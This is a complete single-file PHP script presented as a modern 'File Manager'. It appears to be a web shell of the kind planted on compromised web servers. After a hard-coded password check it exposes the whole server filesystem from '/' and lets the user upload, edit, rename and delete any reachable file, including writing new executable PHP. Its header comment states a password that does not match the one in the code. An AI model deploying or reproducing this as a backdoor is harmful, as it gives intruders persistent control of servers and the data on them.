<?php
// Simple Modern PHP File Manager
// Password: Fm2025
// Compatible with PHP 5.2+ (Using compatible syntax)

error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();

$PASSWORD = 'Xielganteng1';
$SCRIPT_DIR = realpath(dirname(__FILE__));
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    $DOCROOT = getenv('SystemDrive') ? getenv('SystemDrive') . DIRECTORY_SEPARATOR : 'C:\\';
} else {
    $DOCROOT = '/';
}
// Normalize DOCROOT
if (realpath($DOCROOT)) {
    $DOCROOT = realpath($DOCROOT);
}

// Calculate default relative path to script directory
$DEFAULT_DIR = '';
if ($DOCROOT && strpos($SCRIPT_DIR, $DOCROOT) === 0) {
    if (strlen($SCRIPT_DIR) > strlen($DOCROOT)) {
        $DEFAULT_DIR = trim(substr($SCRIPT_DIR, strlen($DOCROOT)), '/\\');
    }
}
$MAX_UPLOAD = ini_get('upload_max_filesize');

// --- Helper Functions ---
function h($s)
{
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}
function u($s)
{
    return urlencode($s);
}

// Safe path handling to prevent evasion
function safe_join_path($base, $path)
{
    if (strpos($path, '..') !== false)
        return false;
    $path = trim($path, '/\\');
    $full = $base . DIRECTORY_SEPARATOR . $path;
    $real = realpath($full);
    // If file doesn't exist yet (creating), we can't realpath it all the way
    // So we check directory
    if ($real === false && (basename($full) !== '.' && basename($full) !== '..')) {
        $dir = dirname($full);
        $realDir = realpath($dir);
        if ($realDir !== false && strpos($realDir, realpath($base)) === 0) {
            return $full;
        }
        return false;
    }
    if ($real !== false && strpos($real, realpath($base)) === 0)
        return $real;
    return false;
}

function format_size($bytes)
{
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    for ($i = 0; $bytes > 1024; $i++)
        $bytes /= 1024;
    return round($bytes, 2) . ' ' . $units[$i];
}

// --- Auth ---
if (!isset($_SESSION['fm_token'])) {
    $_SESSION['fm_token'] = sha1(uniqid(rand(), true));
}
$TOKEN = $_SESSION['fm_token'];

$logged_in = false;
if (isset($_SESSION['fm_auth']) && $_SESSION['fm_auth'] === sha1($PASSWORD)) {
    $logged_in = true;
}

if (!$logged_in && isset($_POST['action']) && $_POST['action'] === 'login') {
    $pw = isset($_POST['password']) ? $_POST['password'] : '';
    if (sha1($pw) === sha1($PASSWORD)) {
        $_SESSION['fm_auth'] = sha1($PASSWORD);
        $logged_in = true;
        header('Location: ' . basename(__FILE__));
        exit;
    } else {
        $error = 'Incorrect password.';
    }
}

if ($logged_in && isset($_GET['logout'])) {
    unset($_SESSION['fm_auth']);
    header('Location: ' . basename(__FILE__));
    exit;
}

//If not logged in, show Login
if (!$logged_in) {
    ?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>FM Login</title>
        <style>
            :root {
                --primary: #3b82f6;
                --bg: #f3f4f6;
                --card: #ffffff;
                --text: #1f2937;
                --error: #ef4444;
            }

            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                background: var(--bg);
                display: flex;
                align-items: center;
                justify-content: center;
                height: 100vh;
                margin: 0;
                color: var(--text);
            }

            .login-card {
                background: var(--card);
                padding: 2rem;
                border-radius: 12px;
                box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
                width: 100%;
                max-width: 320px;
            }

            h2 {
                margin-top: 0;
                font-size: 1.5rem;
                text-align: center;
                margin-bottom: 1.5rem;
            }

            input[type="password"] {
                width: 100%;
                padding: 0.75rem;
                border: 1px solid #d1d5db;
                border-radius: 6px;
                box-sizing: border-box;
                margin-bottom: 1rem;
                font-size: 1rem;
            }

            input[type="submit"] {
                width: 100%;
                padding: 0.75rem;
                background: var(--primary);
                color: white;
                border: none;
                border-radius: 6px;
                font-weight: bold;
                cursor: pointer;
                font-size: 1rem;
                transition: background 0.2s;
            }

            input[type="submit"]:hover {
                background: #2563eb;
            }

            .error {
                color: var(--error);
                font-size: 0.875rem;
                text-align: center;
                margin-bottom: 1rem;
            }
        </style>
    </head>

    <body>
        <div class="login-card">
            <h2>File Manager</h2>
            <?php if (isset($error))
                echo '<div class="error">' . h($error) . '</div>'; ?>
            <form method="post">
                <input type="hidden" name="action" value="login">
                <input type="password" name="password" placeholder="Enter Password" autofocus required>
                <input type="submit" value="Unlock">
            </form>
        </div>
    </body>

    </html>
    <?php
    exit;
}

// --- Main Application Logic ---

$dir = isset($_REQUEST['dir']) ? $_REQUEST['dir'] : $DEFAULT_DIR;
// Prevent traversing up beyond root visually in query param if we wanted strict root lock, 
// but backend safe_join_path handles the security.
$dir = trim(str_replace('..', '', $dir), '/\\');

$curDir = safe_join_path($DOCROOT, $dir);
if ($curDir === false) {
    $curDir = $DOCROOT;
    $dir = '';
}

$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : '';
$msg = '';
$err = '';

function check_csrf()
{
    global $TOKEN;
    if (empty($_POST['token']) || $_POST['token'] !== $TOKEN)
        die('CSRF Token Mismatch');
}

// Handle POST actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($action === 'upload') {
        check_csrf();
        if (!isset($_FILES['file']) || $_FILES['file']['error'] !== 0)
            $err = 'Upload failed or no file selected.';
        else {
            $target = safe_join_path($curDir, basename($_FILES['file']['name']));
            if ($target && move_uploaded_file($_FILES['file']['tmp_name'], $target))
                $msg = 'File uploaded successfully.';
            else
                $err = 'Failed to move uploaded file.';
        }
    } elseif ($action === 'create_folder') {
        check_csrf();
        $name = trim($_POST['name']);
        if ($name === '')
            $err = 'Folder name is empty.';
        else {
            $target = safe_join_path($curDir, $name);
            if ($target && !file_exists($target)) {
                if (mkdir($target, 0755))
                    $msg = 'Folder created.';
                else
                    $err = 'Failed to create folder. Permission denied?';
            } else
                $err = 'Folder already exists or invalid name.';
        }
    } elseif ($action === 'delete') {
        check_csrf();
        $name = isset($_POST['name']) ? $_POST['name'] : '';
        $target = safe_join_path($curDir, $name);
        if ($target) {
            if (is_dir($target)) {
                if (@rmdir($target))
                    $msg = 'Folder deleted.';
                else
                    $err = 'Failed to delete folder. Is it empty?';
            } elseif (is_file($target)) {
                if (@unlink($target))
                    $msg = 'File deleted.';
                else
                    $err = 'Failed to delete file.';
            } else {
                $err = 'Target not found.';
            }
        }
    } elseif ($action === 'rename') {
        check_csrf();
        $old = $_POST['old'];
        $new = $_POST['new'];
        $told = safe_join_path($curDir, $old);
        $tnew = safe_join_path($curDir, $new);
        if ($told && $tnew && file_exists($told) && !file_exists($tnew)) {
            if (rename($told, $tnew))
                $msg = 'Renamed successfully.';
            else
                $err = 'Rename failed.';
        } else
            $err = 'Invalid target or name already exists.';
    } elseif ($action === 'edit_save') {
        check_csrf();
        $name = $_POST['name'];
        $content = $_POST['content'];
        $target = safe_join_path($curDir, $name);
        if ($target && is_file($target)) {
            if (file_put_contents($target, $content) !== false)
                $msg = 'File saved.';
            else
                $err = 'Failed to save file.';
        } else
            $err = 'File not found.';
    }
}

// Logic to get items
$items = array();
if (is_dir($curDir)) {
    $raw = @scandir($curDir);
    if ($raw) {
        foreach ($raw as $f) {
            if ($f === '.' || $f === '..')
                continue;
            $p = $curDir . DIRECTORY_SEPARATOR . $f;
            $items[] = array(
                'name' => $f,
                'is_dir' => is_dir($p),
                'size' => is_dir($p) ? '-' : format_size(filesize($p)),
                'mtime' => date('Y-m-d H:i', filemtime($p))
            );
        }
    }
}

// Sort: Folders first, then files
function fm_sort_items($a, $b)
{
    if ($a["is_dir"] === $b["is_dir"])
        return strcasecmp($a["name"], $b["name"]);
    return $a["is_dir"] ? -1 : 1;
}
usort($items, 'fm_sort_items');

// Handling Edit View inside the same page
$editFile = null;
$editContent = '';
if ($action === 'edit' && isset($_GET['name'])) {
    $target = safe_join_path($curDir, $_GET['name']);
    if ($target && is_file($target)) {
        $editFile = $_GET['name'];
        $editContent = file_get_contents($target);
    }
}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        :root {
            --primary: #3b82f6;
            --primary-hover: #2563eb;
            --bg: #f9fafb;
            --card: #ffffff;
            --text: #1f2937;
            --text-muted: #6b7280;
            --border: #e5e7eb;
            --success: #10b981;
            --error: #ef4444;
        }

        * {
            box-sizing: border-box;
            outline: none;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: var(--bg);
            color: var(--text);
            margin: 0;
            padding: 0;
            font-size: 14px;
        }

        .navbar {
            background: var(--card);
            border-bottom: 1px solid var(--border);
            padding: 0.75rem 1.5rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 10;
            font-size: 0.95rem;
            font-weight: 500;
        }

        .navbar .brand {
            font-weight: 700;
            font-size: 1.1rem;
            color: var(--primary);
            text-decoration: none;
        }

        .nav-actions a {
            color: var(--text-muted);
            text-decoration: none;
            font-size: 0.9rem;
            transition: color 0.2s;
        }

        .nav-actions a:hover {
            color: var(--error);
        }

        .container {
            max-width: 1200px;
            margin: 2rem auto;
            padding: 0 1rem;
        }

        .alert {
            padding: 0.75rem 1rem;
            border-radius: 6px;
            margin-bottom: 1.5rem;
            font-weight: 500;
        }

        .alert.success {
            background: #d1fae5;
            color: #065f46;
        }

        .alert.error {
            background: #fee2e2;
            color: #991b1b;
        }

        .toolbar {
            display: flex;
            flex-wrap: wrap;
            gap: 1rem;
            margin-bottom: 1.5rem;
            background: var(--card);
            padding: 1rem;
            border-radius: 8px;
            border: 1px solid var(--border);
            align-items: center;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
        }

        .breadcrumb {
            flex-grow: 1;
            font-size: 1rem;
            color: var(--text-muted);
            display: flex;
            gap: 0.5rem;
            align-items: center;
        }

        .breadcrumb a {
            color: var(--primary);
            text-decoration: none;
            font-weight: 500;
        }

        .breadcrumb a:hover {
            text-decoration: underline;
        }

        .btn {
            padding: 0.5rem 1rem;
            border-radius: 6px;
            border: 1px solid var(--border);
            background: #fff;
            cursor: pointer;
            font-size: 0.85rem;
            font-weight: 500;
            color: var(--text);
            transition: all 0.2s;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 0.4rem;
        }

        .btn:hover {
            background: #f3f4f6;
            border-color: #d1d5db;
        }

        .btn-primary {
            background: var(--primary);
            border-color: var(--primary);
            color: white;
        }

        .btn-primary:hover {
            background: var(--primary-hover);
        }

        .btn-danger {
            color: var(--error);
            border-color: #fca5a5;
        }

        .btn-danger:hover {
            background: #fef2f2;
        }

        .file-list {
            width: 100%;
            border-collapse: collapse;
            background: var(--card);
            border-radius: 8px;
            overflow: hidden;
            border: 1px solid var(--border);
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
        }

        .file-list th {
            text-align: left;
            padding: 0.75rem 1rem;
            background: #f9fafb;
            border-bottom: 1px solid var(--border);
            font-size: 0.75rem;
            text-transform: uppercase;
            color: var(--text-muted);
            font-weight: 600;
            letter-spacing: 0.05em;
        }

        .file-list td {
            padding: 0.75rem 1rem;
            border-bottom: 1px solid var(--border);
            vertical-align: middle;
        }

        .file-list tr:last-child td {
            border-bottom: none;
        }

        .file-list tr:hover {
            background: #f9fafb;
        }

        .icon {
            width: 20px;
            display: inline-block;
            text-align: center;
            margin-right: 0.5rem;
            font-size: 1.1rem;
        }

        .name-col {
            font-weight: 500;
        }

        .name-col a {
            color: var(--text);
            text-decoration: none;
            display: flex;
            align-items: center;
        }

        .name-col a:hover {
            color: var(--primary);
        }

        .actions {
            display: flex;
            gap: 0.5rem;
            justify-content: flex-end;
        }

        .action-btn {
            background: none;
            border: none;
            cursor: pointer;
            color: var(--text-muted);
            padding: 4px;
            border-radius: 4px;
        }

        .action-btn:hover {
            color: var(--primary);
            background: #eff6ff;
        }

        .action-btn.del:hover {
            color: var(--error);
            background: #fef2f2;
        }

        /* Modal / Overlays for Actions - keeping it simple with inline forms or summary details for now */
        details {
            position: relative;
            display: inline-block;
        }

        details>summary {
            list-style: none;
            cursor: pointer;
        }

        details[open]>summary::before {
            content: '';
            position: fixed;
            inset: 0;
            z-index: 10;
        }

        .dropdown {
            position: absolute;
            right: 0;
            top: 100%;
            width: 220px;
            background: white;
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 1rem;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            z-index: 20;
            margin-top: 5px;
        }

        .dropdown form {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
        }

        .dropdown input[type="text"] {
            padding: 0.5rem;
            border: 1px solid var(--border);
            border-radius: 4px;
            width: 100%;
        }

        /* Editor */
        .editor-container {
            background: var(--card);
            border-radius: 8px;
            border: 1px solid var(--border);
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
            padding: 1rem;
        }

        .editor-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 1rem;
            align-items: center;
            border-bottom: 1px solid var(--border);
            padding-bottom: 1rem;
        }

        textarea.code-editor {
            width: 100%;
            height: 500px;
            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
            font-size: 13px;
            line-height: 1.5;
            padding: 1rem;
            border: 1px solid var(--border);
            border-radius: 6px;
            background: #f8fafc;
            color: #334155;
            resize: vertical;
        }

        .upload-box {
            position: relative;
            overflow: hidden;
            display: inline-block;
        }

        .upload-box input[type=file] {
            position: absolute;
            left: 0;
            top: 0;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }

        @media (max-width: 640px) {
            .container {
                padding: 0.5rem;
            }

            .toolbar {
                flex-direction: column;
                align-items: stretch;
            }

            .file-list td,
            .file-list th {
                padding: 0.5rem;
            }

            .hide-mobile {
                display: none;
            }
        }
    </style>
</head>

<body>

    <nav class="navbar">
        <a href="?" class="brand">FM<span style="font-weight:300">2025</span></a>
        <div class="nav-actions">
            <span style="margin-right: 15px; color: #9ca3af; font-size: 0.85rem">PHP <?php echo phpversion(); ?></span>
            <a href="?logout=1">Sign Out</a>
        </div>
    </nav>

    <div class="container">
        <?php if ($msg): ?>
            <div class="alert success"><?php echo h($msg); ?></div> <?php endif; ?>
        <?php if ($err): ?>
            <div class="alert error"><?php echo h($err); ?></div> <?php endif; ?>

        <?php if ($editFile !== null): ?>
            <!-- Editor View -->
            <div class="editor-container">
                <div class="editor-header">
                    <h3>Editing: <span style="color:var(--primary)"><?php echo h($editFile); ?></span></h3>
                    <div>
                        <a href="?dir=<?php echo u($dir); ?>" class="btn">Cancel</a>
                        <button type="submit" form="editorForm" class="btn btn-primary">Save Changes</button>
                    </div>
                </div>
                <form id="editorForm" method="post" action="?dir=<?php echo u($dir); ?>">
                    <input type="hidden" name="action" value="edit_save">
                    <input type="hidden" name="token" value="<?php echo h($TOKEN); ?>">
                    <input type="hidden" name="name" value="<?php echo h($editFile); ?>">
                    <textarea name="content" class="code-editor"
                        spellcheck="false"><?php echo h($editContent); ?></textarea>
                </form>
            </div>
        <?php else: ?>
            <!-- File Browser View -->
            <div class="toolbar">
                <div class="breadcrumb">
                    <a href="?">Root</a> <span style="color:#d1d5db">|</span> <a
                        href="?dir=<?php echo u($DEFAULT_DIR); ?>">Script Dir</a>
                    <span style="margin-left:5px; margin-right:5px; color:#d1d5db">/</span>
                    <?php
                    if ($dir) {
                        $parts = explode('/', $dir);
                        $path = '';
                        foreach ($parts as $p) {
                            $path .= (($path) ? '/' : '') . $p;
                            echo ' <span style="color:#d1d5db">/</span> <a href="?dir=' . u($path) . '">' . h($p) . '</a>';
                        }
                    }
                    ?>
                </div>

                <div style="display:flex; gap: 0.5rem;">
                    <!-- Create Folder -->
                    <details>
                        <summary class="btn">New Folder</summary>
                        <div class="dropdown">
                            <form method="post">
                                <input type="hidden" name="action" value="create_folder">
                                <input type="hidden" name="token" value="<?php echo h($TOKEN); ?>">
                                <input type="text" name="name" placeholder="Folder Name" required autofocus>
                                <input type="submit" value="Create" class="btn btn-primary" style="width:100%">
                            </form>
                        </div>
                    </details>

                    <!-- Upload -->
                    <form method="post" enctype="multipart/form-data" style="display:inline">
                        <input type="hidden" name="action" value="upload">
                        <input type="hidden" name="token" value="<?php echo h($TOKEN); ?>">
                        <div class="btn btn-primary upload-box">
                            <span>Upload File</span>
                            <input type="file" name="file" onchange="this.form.submit()">
                        </div>
                    </form>
                </div>
            </div>

            <table class="file-list">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th class="hide-mobile" style="width:100px">Size</th>
                        <th class="hide-mobile" style="width:150px">Date</th>
                        <th style="width:120px; text-align:right">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if ($dir): ?>
                        <tr>
                            <td colspan="4">
                                <div class="name-col">
                                    <a href="?dir=<?php echo u(dirname($dir) === '.' ? '' : dirname($dir)); ?>">
                                        <span class="icon">⤴</span> ..
                                    </a>
                                </div>
                            </td>
                        </tr>
                    <?php endif; ?>

                    <?php if (empty($items)): ?>
                        <tr>
                            <td colspan="4" style="text-align:center; color: var(--text-muted); padding: 2rem;">Empty directory
                            </td>
                        </tr>
                    <?php else:
                        foreach ($items as $item): ?>
                            <tr>
                                <td>
                                    <div class="name-col">
                                        <?php if ($item['is_dir']): ?>
                                            <a href="?dir=<?php echo u(($dir ? $dir . '/' : '') . $item['name']); ?>">
                                                <span class="icon" style="color: #f59e0b">📁</span> <?php echo h($item['name']); ?>
                                            </a>
                                        <?php else: ?>
                                            <a href="?dir=<?php echo u($dir); ?>&action=edit&name=<?php echo u($item['name']); ?>">
                                                <span class="icon" style="color: #9ca3af">📄</span> <?php echo h($item['name']); ?>
                                            </a>
                                        <?php endif; ?>
                                    </div>
                                </td>
                                <td class="hide-mobile"><?php echo h($item['size']); ?></td>
                                <td class="hide-mobile" style="color: var(--text-muted); font-size: 0.85rem">
                                    <?php echo h($item['mtime']); ?>
                                </td>
                                <td>
                                    <div class="actions">
                                        <!-- Rename w/ Details Hack -->
                                        <details>
                                            <summary class="action-btn" title="Rename">✏</summary>
                                            <div class="dropdown" style="right:0">
                                                <form method="post">
                                                    <input type="hidden" name="action" value="rename">
                                                    <input type="hidden" name="token" value="<?php echo h($TOKEN); ?>">
                                                    <input type="hidden" name="old" value="<?php echo h($item['name']); ?>">
                                                    <input type="text" name="new" value="<?php echo h($item['name']); ?>" required>
                                                    <input type="submit" value="Rename" class="btn btn-primary" style="width:100%">
                                                </form>
                                            </div>
                                        </details>

                                        <form method="post" style="display:inline"
                                            onsubmit="return confirm('Delete <?php echo h($item['name']); ?>?');">
                                            <input type="hidden" name="action" value="delete">
                                            <input type="hidden" name="token" value="<?php echo h($TOKEN); ?>">
                                            <input type="hidden" name="name" value="<?php echo h($item['name']); ?>">
                                            <button type="submit" class="action-btn del" title="Delete">🗑</button>
                                        </form>
                                    </div>
                                </td>
                            </tr>
                        <?php endforeach; endif; ?>
                </tbody>
            </table>
        <?php endif; ?>
    </div>

</body>

</html>